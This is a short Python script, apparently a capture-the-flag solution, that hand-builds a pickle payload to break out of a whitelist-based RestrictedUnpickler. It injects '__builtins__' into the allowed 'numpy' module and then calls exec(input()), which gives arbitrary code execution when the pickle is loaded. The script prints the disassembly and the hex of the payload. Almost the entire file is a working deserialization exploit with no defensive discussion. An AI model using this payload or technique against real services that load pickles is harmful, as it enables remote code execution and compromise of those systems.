import pickle
import pickletools
from io import BytesIO

p = b"".join([
	pickle.STRING + b"'numpy'\n",
	pickle.STRING + b"'safernumpy'\n",
	pickle.STACK_GLOBAL,
	pickle.STRING + b"'numpy'\n",
	pickle.STRING + b"'__builtins__'\n",
	pickle.STACK_GLOBAL,
	pickle.BUILD,
	pickle.POP,
	pickle.STRING + b"'numpy'\n",
	pickle.STRING + b"'exec'\n",
	pickle.STACK_GLOBAL,
	pickle.MARK,
	pickle.STRING + b"'numpy'\n",
	pickle.STRING + b"'input'\n",
	pickle.STACK_GLOBAL,
	pickle.EMPTY_TUPLE,
	pickle.REDUCE,
	pickle.TUPLE,
	pickle.REDUCE,
	pickle.STOP,
])

safe_modules = {
	"numpy",
	"numpy.core.multiarray",
}


class RestrictedUnpickler(pickle.Unpickler):
	def find_class(self, module, name):
		# Only allow safe modules.
		if "save" in name or "load" in name:
			return
		if module in safe_modules:
			import safernumpy
			import safernumpy.core.multiarray

			return getattr(
				{
					"numpy": safernumpy,
					"numpy.core.multiarray": safernumpy.core.multiarray,
				}[module],
				name,
			)
		# Forbid everything else.
		raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


print(pickletools.dis(p))
# RestrictedUnpickler(BytesIO(p)).load()
print(p.hex())
